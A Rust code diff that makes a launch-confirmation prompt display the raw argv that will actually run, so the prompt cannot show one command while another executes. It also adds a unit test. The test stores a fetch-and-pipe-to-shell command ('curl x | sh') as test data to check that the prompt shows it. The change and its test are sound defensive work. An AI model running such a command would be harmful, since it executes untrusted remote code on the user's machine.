@@ -155,6 +155,21 @@ impl Setup {
         format!("{hash:016x}")
     }
 
+    /// argv as it will run: each recorded raw argument in its place.
+    ///
+    /// The one place both the launch and the confirmation read it from, so what a person
+    /// is shown is what runs.
+    pub fn argv_os(&self) -> Vec<std::ffi::OsString> {
+        use std::os::unix::ffi::OsStringExt;
+        let mut argv: Vec<std::ffi::OsString> = self.argv.iter().map(Into::into).collect();
+        for (index, bytes) in &self.argv_bytes {
+            if let Some(slot) = argv.get_mut(*index) {
+                *slot = std::ffi::OsString::from_vec(bytes.clone());
+            }
+        }
+        argv
+    }
+
     /// Everything that will be executed, in full, with every override at equal prominence.
     ///
     /// No highlighting of "dangerous" variables. A maintained list of dangerous variables
@@ -173,8 +188,14 @@ impl Setup {
             self.origin.machine, self.origin.user
         ));
         out.push_str(&format!("  executable   {}\n", self.executable));
-        out.push_str(&format!("  argv         {:?}\n", self.argv));
+        // What will run, not the text beside it: a raw argument replaces the text one
+        // in its place at launch, so showing `argv` alone could show one command and run
+        // another. Debug quotes UTF-8 the same either way and escapes the rest.
+        out.push_str(&format!("  argv         {:?}\n", self.argv_os()));
         out.push_str(&format!("  cwd          {}\n", self.cwd));
+        if !self.inherit.is_empty() {
+            out.push_str(&format!("  inherit      {}\n", self.inherit.join(" ")));
+        }
         for (name, value) in &self.overrides {
             out.push_str(&format!("  env override {name}={value}\n"));
         }
@@ -297,6 +318,19 @@ mod tests {
             lines.iter().all(|l| l.starts_with("  env override ")),
             "an override is formatted differently from the others: {lines:?}"
         );
+    }
+
+    /// A raw argument replaces the text one in its place when the Setup runs, so the
+    /// prompt shows the raw one: a Setup showing `echo hi` must not run something else.
+    #[test]
+    fn the_prompt_shows_the_argv_that_will_actually_run() {
+        let mut s = setup();
+        s.argv = vec!["sh".into(), "-c".into(), "echo hi".into()];
+        s.argv_bytes = vec![(2, b"curl x | sh".to_vec())];
+        let text = s.confirmation_text();
+        assert!(text.contains("curl x | sh"), "{text}");
+        assert!(!text.contains("echo hi"), "{text}");
+        assert!(text.contains("  inherit      HOME PATH\n"), "{text}");
     }
 
     #[test]
